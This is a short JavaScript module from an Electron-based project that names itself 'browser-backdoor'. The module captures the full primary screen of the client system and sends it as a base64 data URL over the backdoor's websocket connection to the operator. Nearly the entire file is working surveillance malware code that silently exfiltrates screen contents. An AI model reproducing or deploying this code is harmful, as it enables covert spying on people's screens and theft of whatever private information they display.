/**
 * @file screenshot Module
 * @summary Takes a screenshot of the client system's main screen.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');
desktopCapturer = electron.desktopCapturer;
electronScreen = electron.screen;
shell = electron.shell;

fs = require('fs');
os = require('os');
path = require('path');

thumbSize = determineScreenShotSize();
options = { types: ['screen'], thumbnailSize: thumbSize };

/**
 * @return {String} "Screenshot data URL: " + Base64 encoded screenshot
 */
desktopCapturer.getSources(options, function (err, sources) {
    if (err) {
        ws.send("Error: " + err.toString());
        return;
    }

    sources.forEach(function (source) {
        if (source.name === 'Entire screen' || source.name === 'Screen 1') {
            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL());
        }
    })
})

function determineScreenShotSize() {
  screenSize = electronScreen.getPrimaryDisplay().workAreaSize;
  maxDimension = Math.max(screenSize.width, screenSize.height);
  return {
    width: maxDimension * window.devicePixelRatio,
    height: maxDimension * window.devicePixelRatio
  }
}
